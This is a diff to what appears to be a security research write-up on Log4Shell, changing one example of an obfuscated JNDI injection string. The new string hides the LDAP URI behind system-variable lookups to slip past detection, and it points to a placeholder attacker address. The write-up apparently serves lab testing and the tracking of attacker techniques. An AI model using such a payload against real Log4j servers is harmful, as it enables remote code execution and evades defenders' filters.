@@ -109,7 +109,7 @@ We also observed that Unicode characters can be used to successfully exploit the
 
 Another obfuscation capability we have found is when parts of the URI can be hidden behind environment/system variables that will be dynamically expanded, for example:
 
-`${jndi${sys:path.separator}ldap://<ip_address>}`
+`${jndi${sys:path.separator}ldap${sys:path.separator}${sys:file.separator}${sys:file.separator}<ip_address>}`
 
 All of these have been tested against a demo vulnerable setup that we have on our lab (based on https://github.com/christophetd/log4shell-vulnerable-app) and are using to monitor the evolution of attacker methods.
 
